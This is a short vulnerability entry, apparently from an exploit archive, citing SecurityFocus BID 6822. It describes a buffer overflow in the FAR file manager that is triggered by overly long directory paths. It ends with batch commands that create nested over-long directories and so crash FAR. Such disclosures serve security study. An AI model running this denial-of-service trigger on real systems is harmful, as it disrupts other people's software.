@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/6822/info
+
+A buffer overflow vulnerability has been reported for FAR that may result in a denial of service condition. The vulnerability exists due to insufficient bounds checking performed by FAR when parsing directory paths. Specifically, when FAR attempts to parse overly long paths it will crash thereby resulting in a denial of service condition. 
+
+SET A=A<260 chars>A
+SET B=BBBBBBBBBBBBBBBB
+mkdir \\?\c:\%A%
+mkdir \\?\c:\%A%\%A%
+mkdir \\?\c:\%A%\%B%\ 
